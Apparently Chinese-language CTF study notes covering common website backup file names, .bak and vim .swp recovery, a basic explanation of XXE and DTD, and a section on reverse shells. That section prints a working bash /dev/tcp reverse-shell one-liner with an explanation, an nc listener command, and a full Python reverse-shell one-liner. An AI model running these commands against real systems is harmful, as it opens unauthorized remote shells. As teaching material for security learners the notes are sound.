正常备份文件

 一般都是用户自己做的备份便于查找错误和数据恢复。
常见的网站源码备份文件后缀：

  • tar
  • tar.gz
  • zip
  • rar

常见的网站源码备份文件名：

  • web
  • website
  • backup
  • back
  • www
  • wwwroot
  • temp

非正常退出，系统自动备份

  很多软件会有临时文件，在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，我们也可以将这交换文件叫作备份文件。下面我们介绍2中常见的自动备份文件。

.bak 文件

 Bak格式的文件其实是由软件或系统自动创建的备份文件，比如平常使用的Word、PhotoShop等绘图、文字处理软件修改了原文件的内容后，保存了修改后的内容，那么修改前的内容会自动保存为后缀名为bak的备份文件。
 想要打开这类文件可以用产生这个备份文件的原软件了，比如我们经常会有 index.php.bak 这么个文件，它其实是index.php的备份文件，我们直接可以用记事本类似的软件打开。或者把.bak这个后缀删掉再尝试打开。
 一般来讲 .bak文件可以通过直接重命名把bak替换成该文件的格式就可以恢复此文件并且正常打开了，不需要其他软件辅助打开。

VIM 不正常退出产生的swp文件

 当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。
 意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。
如：
 第一次产生的交换文件名为“.filename.txt.swp”；再次意外退出后，将会产生名为“.filename.txt.swo”的交换文件；而第三次产生的交换文件则为“.filename.txt.swn” 注意前面有个.噢！

常用的命令
  1. 可以使用 vim -r 查看单前目录的所有swp文件。
  2. 可以使vim -r filename 来打开到上次意外退出没有保存的修改内容。 这也是做题中最常用到的命令了

什么是 XXE 漏洞

 XXE全称是XML External Entity，也就是XML外部实体注入。
 如果系统允许攻击者利用XML调用外部实体，那么攻击这就可以在调用外部实体时构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。

什么是XML呢 ？

 xml（xtensible markup language）,可扩展标记语言，其实就是一种传输文本的格式，他的格式和html的格式非常相似都是标签语言，通常是用来做配置文件和存贮数据。

再来认识一下 DTD

 因为有了xml来存储数据，但是一个项目可能不是一个人再弄，可能写的五花八门不好理解。这是就出现了 DTD 全称Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。

反弹shell的本质

 反弹shell（reverse shell），就是 攻击端 监听某TCP/UDP端口，客户端（被攻击端）发起请求到该端口，并将其命令行的输入输出转到攻击端 ！

解析上面的命令

  1. bash ： bash就是/bin/目录下的二进制程序，是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别。
  2. nc ：全名叫netcat，它可以在两台电脑之间建立连接，并返回两个数据流。
    • -l 使用监听模式，管控传入的资料。
    • -v 显示指令执行的过程
    • -p 通信端口 设置本地主机使用的通信端口
  3. Linux 文件描述符 ：Linux shell 下有三种标准文件描述符，
    • 0 （stdin）代表标准输入，使用 < 或 <<
    • 1 （stdout）代表标准输出，使用 > 或 <<
    • 2（stderr）代表标准错误输出，使用 2> 或 2>>
  4. 解释 ：bash -i >& /dev/tcp/ip/port 0>&1
    • bash -i 创造一个交互式的shell
    • >& 当它后面接文件时，表示标准输出和标准错误输出（混合输出）重定向到文件。
    • /dev/tcp/ip/port Linux 中一个特殊的设备，打开这个文件，相当于给对应的ip：port 发出一个 socket 调用，建立一个 socket 连接。
    • 0>&1 代表标准输入重定向到标准输出，这里标准输出已经定向到了/dev/tcp/ip/port 这个文件，也就是说标准输入定向到远程。

使用python反弹 shell

  1. 攻击机 使用 nc -lvp 6666 来进行监听次端口。
  2. 客户机上 使用以下命令即可：
    python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
